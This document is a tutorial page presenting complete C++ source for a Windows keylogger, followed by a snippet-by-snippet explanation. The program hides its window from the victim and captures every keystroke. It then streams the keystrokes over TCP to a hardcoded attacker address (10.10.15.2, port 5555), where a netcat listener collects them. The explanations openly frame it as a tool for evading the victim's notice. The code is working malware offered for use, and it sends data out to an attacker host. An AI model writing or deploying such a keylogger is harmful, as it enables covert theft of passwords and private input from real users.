# C++ Keylogger

### Code

```cpp
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "Ws2_32.lib")
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEY;

    WSADATA WSAData;
    SOCKET server;
    SOCKADDR_IN addr;

    WSAStartup(MAKEWORD(2, 0), &WSAData);
    server = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_addr.s_addr = inet_addr("10.10.15.2");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(5555);

    connect(server, (SOCKADDR *)&addr, sizeof(addr));

    while (true) {
        Sleep(10);
        for (int KEY = 0x8; KEY < 0xFF; KEY++)
        {
            if (GetAsyncKeyState(KEY) & 0x8000) {
                char buffer[2];
                buffer[0] = KEY;
                send(server, buffer, sizeof(buffer), 0);
            }
        }
    }

    closesocket(server);
    WSACleanup();
}
```



### Compilation

Add the flag **-lws2\_32** for the linker:



### Description:

The above code would send the keystrokes (only printable characters) of the user to the attacker's machine over a TCP connection, on port 5555.

On the attacker's end, we will be using netcat to setup a listener on port 5555 and receive the data sent by the keylogger program.



### Explanation:

#### Snippet 1:

```cpp
#define _WINSOCK_DEPRECATED_NO_WARNINGS
```

Explanation: We use winsock utilities and we do not want the compiler to complain about older functionalities used, since the below code is sufficient for our needs.

#### Snippet 2:

```cpp
#pragma comment(lib, "Ws2_32.lib")
```

Explanation: We need the Ws2\_32.lib library in order to use sockets (networking) functionality in Windows.

#### Snippet 3:

```cpp
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
```

Explanation: Here we have included some header files. These are:

* **iostream:** includes standard input/output utilities
* **winsock2.h:** includes networking utilities
* **stdio.h:** includes standard input/output utilities (needed for perror())
* **stdlib.h:** includes standard input/output utilities
* **Windows.h:** includes Windows libraries

#### Snippet 4:

```cpp
ShowWindow(GetConsoleWindow(), SW_HIDE);
```

Explanation: To hide the program window so that it's not obvious to the victim that this program is running!

#### Snippet 5:

```cpp
char KEY;
```

Explanation: This variable would hold a single key, for which we would check the status (if it's pressed or not).

#### Snippet 6:

```cpp
WSADATA WSAData;
SOCKET server;
SOCKADDR_IN addr;
```

* WSADATA: This data type (it's a struct) holds information about windows socket implementation.
* SOCKET: This data type stores the connection of the SOCKET type.
* SOCKADDR\_IN: This data type (it's a struct) holds the details of socket connection.

This must make clear what the purpose of the variables mentioned in the above snippet would be.

#### Snippet 7:

```cpp
WSAStartup(MAKEWORD(2, 0), &WSAData);
```

Explanation: Initialize usage of the winsock library (needed for opening a network connection).

#### Snippet 8:

```cpp
server = socket(AF_INET, SOCK_STREAM, 0);
```

Explanation: Set up a TCP socket. AF\_INET means address family for IPv4. SOCK\_STREAM means that we want a TCP socket.

#### Snippet 9:

```cpp
addr.sin_addr.s_addr = inet_addr("10.10.15.2");
addr.sin_family = AF_INET;
addr.sin_port = htons(5555);
```

Explanation: The above snippet would set the IP address of the target we wish to sent the data to (that would be the attacker's IP address). The port used would be 5555 and the IP address is IPv4 which is indicated by AF\_INET.

#### Snippet 10:

```cpp
connect(server, (SOCKADDR *)&addr, sizeof(addr));
```

Explanation: Connect to the previously set up target host/port.

#### Snippet 11:

```cpp
while (true) {
    Sleep(10);
    for (int KEY = 0x8; KEY < 0xFF; KEY++)
    {
        if (GetAsyncKeyState(KEY) & 0x8000) {
            char buffer[2];
            buffer[0] = KEY;
            send(server, buffer, sizeof(buffer), 0);
        }
    }
}
```

Explanation: The above snippet would run an infinite loop and and check if any of the keys in the range (0x8 to 0xFF). Then the GetAsyncKeyState function checks if that key is in pressed state (check the 2nd point of the note below). If the key we checked for is in pressed state, send the pressed key's ASCII value to the attacker over the established TCP socket.

Note: 1. If you are wondering why 0x1-0x7 are not included, check the list of virtual keycodes here. The range of keycodes from 0x1-0x7 are uninteresting from a keylogger's perspective and that's why they are ignored! If you wish to log only the printable characters, you can further narrow down the range of the loop.

As per the GetAsyncKeyState function's documentation: If the function succeeds, the return value specifies whether the key was pressed since the last call to GetAsyncKeyState, and whether the key is currently up or down. If the most significant bit is set, the key is down, and if the least significant bit is set, the key was pressed after the previous call to GetAsyncKeyState. However, you should not rely on this last behavior

So if the most significant bit was set, the key is currently pressed! And that's what & 0x8000 does. It checks if the MSB is set to 1.

If you notice, there's a call to Sleep function as well. That would prevent this keylogger to consume a lot of CPU cycles and thus prevent spiking the CPU usage, which could slow down the machine and even give an indication to the victim that something unusual is wrong on!

#### Snippet 12:

```cpp
closesocket(server);
```

Explanation: Close the socket.

#### Snippet 13:

```cpp
WSACleanup();
```

Explanation: Clean up the Winsock library components.

